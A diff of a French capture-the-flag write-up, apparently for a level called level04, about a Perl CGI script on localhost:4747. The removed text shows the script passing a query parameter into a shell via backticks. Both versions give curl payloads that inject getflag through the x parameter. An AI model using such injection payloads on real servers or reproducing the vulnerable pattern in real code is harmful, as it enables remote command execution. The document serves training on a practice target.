@@ -1,28 +1,32 @@
-Quand on se log on a un fichier exe: level04.pl
+Quand on se log on a un script perl qui s'appelle level04.pl
 
-quand on l'execute on a:
-$ ./level04.pl 
-Content-type: text/html
+Voici une version simplifié de ce script:
 
-quand on le cat on a:
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
 print "Content-type: text/html\n\n";
-sub x {
-  $y = $_[0];
-  print `echo $y 2>&1`;
-}
-x(param("x"));
+print param("x");
 
-On apprend donc ici que le fichier execute un script qui utilise CGI 
-donc qui est donne par un serveur web sur le port 4747.
+Un script CGI va est typiquement exécuté par un web server pour produire une page html dynamiquement. 
+Le corps de la requête est piped vers l'entrée standard du programme et la query string dans la variable
+d'env QUERY_STRING. Le script utilise un module CGI qui lui permet de parser et stocker toute ces informations.
+Donc print param("x") print la valeur du query parameter x
 
-Le script affiche la valeur du parametre via la commande echo.
-On peut tester avec curl:
+On peut tester avec curl à l'interface donné dans le commentaire du script:
+
 curl localhost:4747?x=bonjour
+
 bonjour
 
-on met getflag en argument
-curl 'localhost:4747?x=$(getflag)'
-Check flag.Here is your token :
+On a vu que le script original, perl comprend la syntaxe même syntaxe que bash avec les backticks qui
+permet de récupérer l'output d'une commande. 
+Exemple :
+
+echo "Today we are" `date`
+
+Comme on est très malin on met getflag en argument
+
+curl 'localhost:4747?x=`getflag`' #On oublie pas d'utiliser les single quotes pour pas que ce soit bash qui fasse la substition
+
+Bingo
